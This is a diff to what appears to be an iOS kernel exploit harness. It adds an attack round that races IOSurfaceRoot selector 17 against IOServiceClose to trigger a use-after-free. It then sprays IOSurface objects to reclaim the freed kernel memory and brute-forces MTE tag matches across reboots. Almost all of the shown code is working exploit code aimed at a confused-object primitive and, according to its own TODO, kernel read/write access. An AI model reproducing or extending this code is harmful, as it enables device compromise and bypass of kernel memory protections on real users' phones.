@@ -20252,7 +20252,7 @@ new_modes:
          */
         if (rounds >= 170 && rounds != 219 && rounds != 225) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
-            if ((rounds >= 220 && rounds <= 224) || rounds == 226 || rounds == 227 || rounds == 228) goto r220_block;
+            if ((rounds >= 220 && rounds <= 224) || rounds == 226 || rounds == 227 || rounds == 228 || rounds == 229) goto r220_block;
 
             dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
                 dispatch_get_global_queue(0, 0), ^{
@@ -26588,6 +26588,186 @@ new_modes:
              * This avoids MTE tag faults because the reclaim allocates a fresh
              * entry with valid MTE tags.
              */
+            if (rounds == 229) {
+                rlog("\n=== r=229: MTE brute-force GEN1 reclaim ===\n");
+
+                /* Persistent attempt counter across reboots */
+                char state_path[512];
+                snprintf(state_path, sizeof(state_path), "%s/Documents/r229_state.bin",
+                    getenv("HOME") ? getenv("HOME") : "/var/mobile");
+                int attempt = 0;
+                FILE *sf = fopen(state_path, "rb");
+                if (sf) {
+                    fread(&attempt, sizeof(int), 1, sf);
+                    fclose(sf);
+                }
+                attempt++;
+                sf = fopen(state_path, "wb");
+                if (sf) {
+                    fwrite(&attempt, sizeof(int), 1, sf);
+                    fclose(sf);
+                }
+                rlog("  Attempt #%d (expect ~16 for MTE match, 1/16 per try)\n", attempt);
+
+                io_service_t svc229 = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (!svc229) { rlog("  NO svc!\n"); goto phase17_done; }
+
+                /* Step 1: Create a victim IOSurface via public API (GEN1 object) */
+                CFMutableDictionaryRef sp229 = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int w229 = 32, h229 = 32, bpe229 = 4, bpr229 = w229 * bpe229;
+                CFNumberRef wn229 = CFNumberCreate(NULL, kCFNumberIntType, &w229);
+                CFNumberRef hn229 = CFNumberCreate(NULL, kCFNumberIntType, &h229);
+                CFNumberRef bn229 = CFNumberCreate(NULL, kCFNumberIntType, &bpe229);
+                CFNumberRef rn229 = CFNumberCreate(NULL, kCFNumberIntType, &bpr229);
+                int pf229 = 0x42475241;
+                CFNumberRef pfn229 = CFNumberCreate(NULL, kCFNumberIntType, &pf229);
+                CFDictionarySetValue(sp229, CFSTR("IOSurfaceWidth"), wn229);
+                CFDictionarySetValue(sp229, CFSTR("IOSurfaceHeight"), hn229);
+                CFDictionarySetValue(sp229, CFSTR("IOSurfaceBytesPerElement"), bn229);
+                CFDictionarySetValue(sp229, CFSTR("IOSurfaceBytesPerRow"), rn229);
+                CFDictionarySetValue(sp229, CFSTR("IOSurfacePixelFormat"), pfn229);
+
+                /* Step 2: Minimal race — 2 connections, trigger UAF with sel17/IOServiceClose race
+                 * Goal: create exactly 1 stale notification entry (GEN2) pointing to freed IOSurface (GEN1)
+                 * Fewer connections = fewer stale entries = need only 1 MTE tag to match (1/16)
+                 * vs 8 connections where ALL must match = (1/16)^N which is impossible */
+                rlog("  Step 2: Minimal v_race8 (2 conn) x5 iterations\n");
+                uint64_t inp229[3] = {1, 2, 3};
+
+                for (int iter = 0; iter < 5; iter++) {
+                    io_connect_t cs229[2];
+                    int have229[2] = {0, 0};
+                    for (int i = 0; i < 2; i++) {
+                        if (IOServiceOpen(svc229, mach_task_self(), 0, &cs229[i]) == KERN_SUCCESS) {
+                            have229[i] = 1;
+                            mach_port_t twp = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &twp);
+                            mach_port_insert_right(mach_task_self(), twp, twp, MACH_MSG_TYPE_MAKE_SEND);
+                            uint64_t ref = 0xDEAD229000000000ULL | (iter << 8) | i;
+                            IOConnectCallAsyncMethod(cs229[i], 17, twp, &ref, 1,
+                                NULL, 0, inp229, 24, NULL, NULL, NULL, NULL);
+                            mach_port_deallocate(mach_task_self(), twp);
+                        }
+                    }
+
+                    /* Spam thread on first connection — creates race window */
+                    p13_spam_run = 1;
+                    p13_spam_conn = have229[0] ? cs229[0] : IO_OBJECT_NULL;
+                    p13_spam_shape = 1;
+                    p13_spam_count = 0;
+                    pthread_t spam229[4];
+                    for (int t = 0; t < 4; t++)
+                        pthread_create(&spam229[t], NULL, p13_spam_reg, NULL);
+
+                    /* Staggered close — trigger the race */
+                    for (int i = 0; i < 2; i++) {
+                        if (have229[i]) {
+                            IOServiceClose(cs229[i]);
+                            have229[i] = 0;
+                        }
+                        usleep(50 + iter * 30);
+                    }
+
+                    p13_spam_run = 0;
+                    for (int t = 0; t < 4; t++) pthread_join(spam229[t], NULL);
+                    for (int i = 0; i < 2; i++) if (have229[i]) IOServiceClose(cs229[i]);
+
+                    rlog("    iter[%d] spam=%llu\n", iter, (unsigned long long)p13_spam_count);
+                }
+
+                /* Step 3: DO NOT reclaim GEN2 — leave stale notification entries intact
+                 * The stale entries still point to freed GEN1 IOSurface memory
+                 * This is the key difference from r=225 which DID reclaim GEN2 */
+                rlog("  Step 3: Skipping GEN2 reclaim (stale entries preserved)\n");
+
+                /* Step 4: GEN1 spray — create IOSurface objects to reclaim freed memory
+                 * Each IOSurface is a large GEN1 object. If one lands in the freed victim's slot,
+                 * and MTE tags match (1/16 chance), the stale notification entry will read from
+                 * our new IOSurface's fields instead of the freed one */
+                rlog("  Step 4: GEN1 IOSurface spray (48 surfaces)\n");
+                IOSurfaceRef spray229[48];
+                int spray229_n = 0;
+                for (int i = 0; i < 48; i++) {
+                    spray229[i] = IOSurfaceCreate(sp229);
+                    if (spray229[i]) {
+                        spray229_n++;
+                        /* Set a known value at the lock pointer offset (+0xD8)
+                         * via IOSurface properties — if the stale entry reads from our
+                         * surface, the lock acquire at +0xD8 will use our controlled data.
+                         * We set distinctive property values so we can identify our surface
+                         * in a panic log if MTE check passes but lock ptr is bad */
+                        char key[32];
+                        snprintf(key, sizeof(key), "spray229_%d", i);
+                        CFStringRef ks = CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8);
+                        int marker = 0x229B0000 | i;
+                        CFNumberRef mv = CFNumberCreate(NULL, kCFNumberIntType, &marker);
+                        IOSurfaceSetValue(spray229[i], ks, mv);
+                        CFRelease(ks);
+                        CFRelease(mv);
+                    }
+                }
+                rlog("    Sprayed %d IOSurface objects into GEN1\n", spray229_n);
+
+                /* Step 5: Wait — give compositor/system time to traverse notification list
+                 * If MTE tags match: the stale entry reads IOSurface+0xD8 from our spray object
+                 *   → likely panic at lock acquisition (bad lock ptr) or further in dispatch
+                 *   → BUT we survived the MTE check, which is the hard part
+                 * If MTE tags don't match: MTE fault → kernel panic → reboot → try again */
+                rlog("  Step 5: Waiting 4s for compositor notification traversal...\n");
+                rlog("  If we survive: MTE MATCHED — controlled IOSurface confusion achieved!\n");
+                rlog("  If panic (ESR 0x96000011): MTE mismatch, reboot and retry\n");
+
+                /* Trigger notification dispatch by modifying our spray surfaces */
+                for (int wave = 0; wave < 4; wave++) {
+                    for (int i = 0; i < spray229_n && i < 48; i++) {
+                        if (spray229[i]) {
+                            IOSurfaceLock(spray229[i], 0, NULL);
+                            void *base = IOSurfaceGetBaseAddress(spray229[i]);
+                            if (base) memset(base, 0x41 + wave, 32 * 32 * 4);
+                            IOSurfaceUnlock(spray229[i], 0, NULL);
+                        }
+                    }
+                    usleep(1000000); /* 1s per wave */
+                    rlog("    wave %d/4 — still alive (good!)\n", wave + 1);
+                }
+
+                /* If we get here, either:
+                 * a) No stale entries were created (race didn't trigger) — most likely
+                 * b) MTE tags matched AND the confused IOSurface worked — JACKPOT
+                 * c) The notification list was never traversed in this window */
+                rlog("  === SURVIVED 4s — checking status ===\n");
+                rlog("  Attempt #%d survived. Race may not have triggered, or\n", attempt);
+                rlog("  MTE matched and we have a confused IOSurface primitive.\n");
+                rlog("  Next: verify by checking if any spray surface has unexpected state.\n");
+
+                /* Check spray surfaces for signs of confusion */
+                for (int i = 0; i < spray229_n && i < 48; i++) {
+                    if (!spray229[i]) continue;
+                    IOSurfaceID sid = IOSurfaceGetID(spray229[i]);
+                    uint32_t w = IOSurfaceGetWidth(spray229[i]);
+                    uint32_t h = IOSurfaceGetHeight(spray229[i]);
+                    size_t ab = IOSurfaceGetAllocSize(spray229[i]);
+                    if (w != 32 || h != 32) {
+                        rlog("  !!! CONFUSED surface[%d]: id=%u w=%u h=%u alloc=%zu\n",
+                            i, sid, w, h, ab);
+                        rlog("  !!! THIS IS A CONTROLLED PRIMITIVE — MTE BYPASSED!\n");
+                        /* TODO r=230: exploit this confused surface for kernel R/W */
+                    }
+                    if (i < 4 || i == spray229_n - 1)
+                        rlog("    spray[%d]: id=%u w=%u h=%u alloc=%zu\n", i, sid, w, h, ab);
+                }
+
+                /* Cleanup */
+                for (int i = 0; i < 48; i++) if (spray229[i]) CFRelease(spray229[i]);
+                CFRelease(wn229); CFRelease(hn229); CFRelease(bn229); CFRelease(rn229); CFRelease(pfn229);
+                CFRelease(sp229);
+                IOObjectRelease(svc229);
+                rlog("=== r=229 attempt #%d complete ===\n", attempt);
+                goto phase17_done;
+            }
+
             if (rounds == 228) {
                 rlog("\n=== r=228: IOSurface notification message inspection ===\n");
 
